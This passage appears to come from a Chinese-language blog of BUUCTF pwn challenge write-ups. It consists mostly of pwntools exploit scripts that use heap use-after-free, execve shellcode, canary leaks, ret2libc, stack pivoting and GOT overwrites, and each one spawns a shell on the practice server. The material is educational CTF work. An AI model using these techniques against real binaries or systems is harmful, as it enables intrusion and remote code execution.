class="hljs-number">1</span>:<br>gdb.<span class="hljs-built_in">attach</span>(io)<br>elf=<span class="hljs-built_in">ELF</span>(filename)<br># - - - - - - - - - - - - - #<br>s   = lambda content : io.<span class="hljs-built_in">send</span>(content)<br>sl  = lambda content : io.<span class="hljs-built_in">sendline</span>(content)<br>sa  = lambda content,send : io.<span class="hljs-built_in">sendafter</span>(content, send)<br>sla = lambda content,send : io.<span class="hljs-built_in">sendlineafter</span>(content, send)<br>rc  = lambda number : io.<span class="hljs-built_in">recv</span>(number)<br>ru  = lambda content : io.<span class="hljs-built_in">recvuntil</span>(content)<br>rcg = lambda : <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">6</span>).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>rcu64 = lambda : <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(b<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br># - - - - - - - - - - - - - #<br>def <span class="hljs-built_in">choice</span>(c):<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;CNote&quot;</span>,<span class="hljs-built_in">str</span>(c))<br>def <span class="hljs-built_in">add</span>(idx,size,data):<br><span class="hljs-built_in">choice</span>(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Index&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Type&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Length &gt;&quot;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Value &gt; &quot;</span>,data)<br>def <span class="hljs-built_in">free</span>(idx):<br><span class="hljs-built_in">choice</span>(<span class="hljs-number">2</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Index&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br># - - - - - - - - - - - - - #<br>sys=elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br># - - - - - - - - - - - - - #<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x38,b<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>x38,b<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">1</span>)<br>p=b<span class="hljs-string">&#x27;bash&#x27;</span>+<span class="hljs-built_in">p32</span>(sys)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>xc,p)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">0</span>)<br>io.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure><h2 id="pwnable-start"><a href="#pwnable-start" class="headerlink" title="pwnable_start"></a>pwnable_start</h2><p>主要是看汇编</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn import*<br><br><span class="hljs-attribute">io_ch</span>=1<br><span class="hljs-attribute">de_bug</span>=0<br><span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;i386&#x27;</span><br><span class="hljs-attribute">filename</span>=<span class="hljs-string">&#x27;./start&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">io_ch</span>==1:<br><span class="hljs-attribute">io</span>=remote(&#x27;node4.buuoj.cn&#x27;,29084)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-attribute">io</span>=process(filename)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">de_bug</span>==1:<br>gdb.attach(io)<br><span class="hljs-attribute">elf</span>=ELF(filename)<br><span class="hljs-comment">#libc=ELF(&#x27;&#x27;)</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>s   = lambda content : io.send(content)<br>sl  = lambda content : io.sendline(content)<br>sa  = lambda content,send : io.sendafter(content, send)<br>sla = lambda content,send : io.sendlineafter(content, send)<br>rc  = lambda number : io.recv(number)<br>ru  = lambda content : io.recvuntil(content)<br>rcg = lambda : u64(rc(6).ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-attribute">stack_addr_0</span>=0x08048087<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-attribute">p</span>=b&#x27;A&#x27;*0x14+p32(stack_addr_0)<br>sa(<span class="hljs-string">&quot;CTF:&quot;</span>,p)<br><span class="hljs-attribute">addr_1</span>=u32(rc(4))<br><span class="hljs-built_in">print</span>(hex(addr_1))<br>shell= b<span class="hljs-string">&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span><br>p= b<span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-number">*0</span>x14 + p32(addr_1+0x14) + shell<br>s(p)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="others-babystack"><a href="#others-babystack" class="headerlink" title="others_babystack"></a>others_babystack</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs css">#!/usr/bin/env python3<br># -*-coding:utf-<span class="hljs-number">8</span> -*-<br>from pwn import*<br>from LibcSearcher import*<br>io_ch=<span class="hljs-number">1</span><br>de_bug=<span class="hljs-number">0</span><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>filename=<span class="hljs-string">&#x27;./stack&#x27;</span><br><span class="hljs-built_in">context</span>(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br>if io_ch==<span class="hljs-number">1</span>:<br>io=<span class="hljs-built_in">remote</span>(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27470</span>)<br>else:<br>io=<span class="hljs-built_in">process</span>(filename)<br>if de_bug==<span class="hljs-number">1</span>:<br>gdb.<span class="hljs-built_in">attach</span>(io)<br>elf=<span class="hljs-built_in">ELF</span>(filename)<br>#libc=()<br># - - - - - - - - - - - - - #<br>s   = lambda content : io.<span class="hljs-built_in">send</span>(content)<br>sl  = lambda content : io.<span class="hljs-built_in">sendline</span>(content)<br>sa  = lambda content,send : io.<span class="hljs-built_in">sendafter</span>(content, send)<br>sla = lambda content,send : io.<span class="hljs-built_in">sendlineafter</span>(content, send)<br>rc  = lambda number : io.<span class="hljs-built_in">recv</span>(number)<br>ru  = lambda content : io.<span class="hljs-built_in">recvuntil</span>(content)<br>rcg = lambda : <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">6</span>).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>rcu64 = lambda : <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(b<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br># - - - - - - - - - - - - - #<br>def <span class="hljs-built_in">cmd</span>(c):<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(c))<br># - - - - - - - - - - - - - #<br>offest=<span class="hljs-number">0</span>x88<br>ret=<span class="hljs-number">0</span>x000000000040067e<br>rdi=<span class="hljs-number">0</span>x0000000000400a93<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main=<span class="hljs-number">0</span>x0000000000400908<br># - - - - - - - - - - - - - #<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">1</span>)<br>p1=b<span class="hljs-string">&#x27;a&#x27;</span>*(offest-<span class="hljs-number">1</span>)+b<span class="hljs-string">&#x27;b&#x27;</span><br><span class="hljs-built_in">sl</span>(p1)<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">2</span>)<br><span class="hljs-built_in">ru</span>(<span class="hljs-string">&#x27;b&#x27;</span>)<br>canary=<span class="hljs-built_in">u64</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">8</span>))-<span class="hljs-number">0</span>xa<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">1</span>)<br>p2=b<span class="hljs-string">&#x27;a&#x27;</span>*offest+<span class="hljs-built_in">p64</span>(canary)+<span class="hljs-built_in">p64</span>(ret)+<span class="hljs-built_in">p64</span>(rdi)+<span class="hljs-built_in">p64</span>(puts_got)+<span class="hljs-built_in">p64</span>(puts_plt)+<span class="hljs-built_in">p64</span>(main)<br><span class="hljs-built_in">sl</span>(p2)<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">3</span>)<br>puts_addr=<span class="hljs-built_in">rcg</span>()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br>libc=<span class="hljs-built_in">LibcSearcher</span>(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>base=puts_addr-libc.<span class="hljs-built_in">dump</span>(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>sys=libc.<span class="hljs-built_in">dump</span>(<span class="hljs-string">&#x27;system&#x27;</span>)+base<br>bs=libc.<span class="hljs-built_in">dump</span>(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)+base<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">1</span>)<br>p=b<span class="hljs-string">&#x27;a&#x27;</span>*offest+<span class="hljs-built_in">p64</span>(canary)+<span class="hljs-built_in">p64</span>(ret)+<span class="hljs-built_in">p64</span>(rdi)+<span class="hljs-built_in">p64</span>(bs)+<span class="hljs-built_in">p64</span>(sys)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x0)<br><span class="hljs-built_in">sl</span>(p)<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">3</span>)<br>io.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure><h2 id="gyctf-2020-borrowstack"><a href="#gyctf-2020-borrowstack" class="headerlink" title="gyctf_2020_borrowstack"></a>gyctf_2020_borrowstack</h2><p>栈迁移，不过有一些需要注意的点</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-keyword">from</span> LibcSearcher import*<br><span class="hljs-attribute">io_ch</span>=1<br><span class="hljs-attribute">de_bug</span>=1<br><span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-attribute">filename</span>=<span class="hljs-string">&#x27;./gyc&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">io_ch</span>==1:<br><span class="hljs-attribute">io</span>=remote(&#x27;node4.buuoj.cn&#x27;,26946)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-attribute">io</span>=process(filename)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">de_bug</span>==1:<br>gdb.attach(io)<br><span class="hljs-attribute">elf</span>=ELF(filename)<br><span class="hljs-comment">#libc=()</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>s   = lambda content : io.send(content)<br>sl  = lambda content : io.sendline(content)<br>sa  = lambda content,send : io.sendafter(content, send)<br>sla = lambda content,send : io.sendlineafter(content, send)<br>rc  = lambda number : io.recv(number)<br>ru  = lambda content : io.recvuntil(content)<br>rcg = lambda : u64(rc(6).ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>rcu64 = lambda : u64(ru(b<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-attribute">offest</span>=0x60<br><span class="hljs-attribute">ret</span>=0x00000000004004c9<br><span class="hljs-attribute">rdi</span>=0x0000000000400703<br><span class="hljs-attribute">leave</span>=0x0000000000400699<br><span class="hljs-attribute">bank</span>=0x0000000000601080<br><span class="hljs-attribute">main</span>=0x0000000000400626<br><span class="hljs-attribute">puts_plt</span>=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">puts_pot</span>=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>gadget=[0x45216,0x4526a,0xf02a4,0xf1147]<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-attribute">p1</span>=b&#x27;a&#x27;*offest+p64(bank)+p64(leave)<br>sa(<span class="hljs-string">&quot;Ｗelcome to Stack bank,Tell me what you want&quot;</span>,p1)<br><span class="hljs-attribute">p2</span>=p64(ret)*20+p64(rdi)+p64(puts_pot)+p64(puts_plt)+p64(main)<br>sla(<span class="hljs-string">&quot;Done!You can check and use your borrow stack now!&quot;</span>,p2)<br>io.recvline()<br><span class="hljs-attribute">puts_addr</span>=rcg()<br><span class="hljs-built_in">print</span>(hex(puts_addr))<br><span class="hljs-attribute">libc</span>=LibcSearcher(&#x27;puts&#x27;,puts_addr)<br><span class="hljs-attribute">base</span>=puts_addr-libc.dump(&#x27;puts&#x27;)<br><span class="hljs-built_in">print</span>(hex(base))<br><span class="hljs-comment">#sys=base+libc.dump(&#x27;system&#x27;)</span><br><span class="hljs-comment">#bs=base+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="hljs-comment">#p1=b&#x27;a&#x27;*offest+p64(bank)+p64(leave)</span><br><span class="hljs-attribute">one</span>=base+gadget[3]<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*offest+p64(ret)+p64(one)<br>s(p)<br><span class="hljs-comment">#p2=p64(ret)*8+p64(rdi)+p64(bs)+p64(sys)+p64(main)</span><br><span class="hljs-comment">#s(p2)</span><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h2><p>开始由于脚本写错了，gdb调试的时候出现了奇怪的现象（堆的数量是我申请的2倍）我重新安装了gdb才发现是脚本错了，费了我好长的时间</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs css">#!/usr/bin/env python3<br># -*-coding:utf-<span class="hljs-number">8</span> -*-<br>from pwn import*<br>from LibcSearcher import*<br>io_ch=<span class="hljs-number">1</span><br>de_bug=<span class="hljs-number">0</span><br>arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>filename=<span class="hljs-string">&#x27;./baby&#x27;</span><br><span class="hljs-built_in">context</span>(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br>if io_ch==<span class="hljs-number">1</span>:<br>io=<span class="hljs-built_in">remote</span>(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25954</span>)<br>else:<br>io=<span class="hljs-built_in">process</span>(filename)<br>if de_bug==<span class="hljs-number">1</span>:<br>gdb.<span class="hljs-built_in">attach</span>(io)<br>elf=<span class="hljs-built_in">ELF</span>(filename)<br>#libc=()<br># - - - - - - - - - - - - - #<br>s   = lambda content : io.<span class="hljs-built_in">send</span>(content)<br>sl  = lambda content : io.<span class="hljs-built_in">sendline</span>(content)<br>sa  = lambda content,send : io.<span class="hljs-built_in">sendafter</span>(content, send)<br>sla = lambda content,send : io.<span class="hljs-built_in">sendlineafter</span>(content, send)<br>rc  = lambda number : io.<span class="hljs-built_in">recv</span>(number)<br>ru  = lambda content : io.<span class="hljs-built_in">recvuntil</span>(content)<br>rcg = lambda : <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">6</span>).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>rcu64 = lambda : <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(b<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br># - - - - - - - - - - - - - #<br>def <span class="hljs-built_in">cmd</span>(c):<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Action: &quot;</span>,<span class="hljs-built_in">str</span>(c))<br>def <span class="hljs-built_in">edit</span>(idx,data):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">3</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;text length: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;text: &quot;</span>,data)<br>def <span class="hljs-built_in">add</span>(size,data):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;size of description: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;name: &quot;</span>,b<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;text length: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;text: &quot;</span>,data)<br>def <span class="hljs-built_in">show</span>(idx):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">2</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>def <span class="hljs-built_in">free</span>(idx):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br># - - - - - - - - - - - - - #<br>free_got=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br># - - - - - - - - - - - - - #<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x80,b<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0</span>x80)#<span class="hljs-number">0</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x80,b<span class="hljs-string">&#x27;d&#x27;</span>*<span class="hljs-number">0</span>x80)#<span class="hljs-number">1</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x8,b<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)#<span class="hljs-number">2</span><br><span class="hljs-built_in">free</span>(<span class="hljs-number">0</span>)<br>p1=b<span class="hljs-string">&#x27;f&#x27;</span>*<span class="hljs-number">0</span>x100+<span class="hljs-built_in">p32</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+<span class="hljs-built_in">p32</span>(<span class="hljs-number">0</span>x110)+<span class="hljs-built_in">p32</span>(<span class="hljs-number">0</span>x89)+b<span class="hljs-string">&#x27;f&#x27;</span>*<span class="hljs-number">0</span>x80+<span class="hljs-built_in">p32</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p32</span>(<span class="hljs-number">0</span>x89)+<span class="hljs-built_in">p32</span>(free_got)+b<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">4</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x100,p1)#<span class="hljs-number">3</span><br><span class="hljs-built_in">show</span>(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">ru</span>(<span class="hljs-string">&quot;description: &quot;</span>)<br>free_addr=<span class="hljs-built_in">u32</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(free_addr))<br>libc=<span class="hljs-built_in">LibcSearcher</span>(<span class="hljs-string">&#x27;free&#x27;</span>,free_addr)<br>base=free_addr-libc.<span class="hljs-built_in">dump</span>(<span class="hljs-string">&#x27;free&#x27;</span>)<br>sys=base+libc.<span class="hljs-built_in">dump</span>(<span class="hljs-string">&#x27;system&#x27;</span>)<br>p1=<span class="hljs-built_in">p32</span>(sys)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">1</span>,p1)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">2</span>)<br>io.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure><h2 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a>hitcontraining_heapcreator</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs css">#!/usr/bin/env python3<br># -*-coding:utf-<span class="hljs-number">8</span> -*-<br>from pwn import*<br>from LibcSearcher import*<br>io_ch=<span class="hljs-number">1</span><br>de_bug=<span class="hljs-number">0</span><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>filename=<span class="hljs-string">&#x27;./heap&#x27;</span><br><span class="hljs-built_in">context</span>(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br>if io_ch==<span class="hljs-number">1</span>:<br>io=<span class="hljs-built_in">remote</span>(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25732</span>)<br>else:<br>io=<span class="hljs-built_in">process</span>(filename)<br>if de_bug==<span class="hljs-number">1</span>:<br>gdb.<span class="hljs-built_in">attach</span>(io)<br>elf=<span class="hljs-built_in">ELF</span>(filename)<br>#libc=()<br># - - - - - - - - - - - - - #<br>s   = lambda content : io.<span class="hljs-built_in">send</span>(content)<br>sl  = lambda content : io.<span class="hljs-built_in">sendline</span>(content)<br>sa  = lambda content,send : io.<span class="hljs-built_in">sendafter</span>(content, send)<br>sla = lambda content,send : io.<span class="hljs-built_in">sendlineafter</span>(content, send)<br>rc  = lambda number : io.<span 